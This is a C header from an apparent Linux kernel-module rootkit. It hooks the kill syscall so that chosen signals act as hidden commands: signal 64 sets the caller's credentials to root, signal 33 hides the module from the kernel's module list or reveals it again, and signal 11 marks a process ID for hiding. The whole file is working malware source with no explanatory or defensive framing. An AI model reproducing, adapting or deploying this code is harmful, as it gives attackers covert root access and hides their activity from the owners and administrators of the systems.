#ifndef _KILL_H_
#define _KILL_H_

static struct list_head *prev_module;
static short hidden = 0;

char hide_pid[NAME_MAX];


static asmlinkage long (*orig_kill)(const struct pt_regs *);

notrace asmlinkage int hook_kill(const struct pt_regs *regs)
{
    void set_root(void);
    void showme(void);
    void hideme(void);

    pid_t pid = regs->di;

    int sig = regs->si;

    if ( sig == 64 )
    {
        printk(KERN_INFO "rootkit: giving root...\n");
        set_root();
        return 0;
    }
    if ((sig == 33) && (hidden == 0))
    {
        printk(KERN_INFO "rootkit: hiding rootkit kernel module...\n");
        hideme();
        hidden = 1;
    }
    else if ( (sig == 33) && (hidden == 1) )
    {
        printk(KERN_INFO "rootkit: revealing rootkit kernel module...\n");
        showme();
        hidden = 0;
    }
    if ( sig == 11 )
    {
        printk(KERN_INFO "lkm: hiding process with PID %d\n", pid);
        sprintf(hide_pid, "%d", pid);
    }
    else
    {
        return orig_kill(regs);
    }

    return 0;
}

void set_root(void)
{
    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
        return;

    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    commit_creds(root);
}

void showme(void)
{
    list_add(&THIS_MODULE->list, prev_module);
}

void hideme(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

#endif
